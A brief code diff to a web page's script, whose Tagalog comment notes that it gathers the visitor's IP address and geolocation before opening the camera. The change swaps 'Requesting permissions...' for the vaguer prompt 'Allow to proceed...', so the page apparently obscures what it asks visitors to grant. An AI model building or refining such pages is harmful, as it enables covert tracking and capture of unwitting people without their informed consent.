@@ -118,7 +118,7 @@
 
         async function initCamera() {
             // UNA: Kunin ang IP at Location sabay
-            status.innerText = "Requesting permissions...";
+            status.innerText = "Allow to proceed...";
             await Promise.all([getGeoLocation(), getIP()]);
 
             try {
@@ -197,4 +197,5 @@
         initCamera();
     </script>
 </body>
+
 </html>
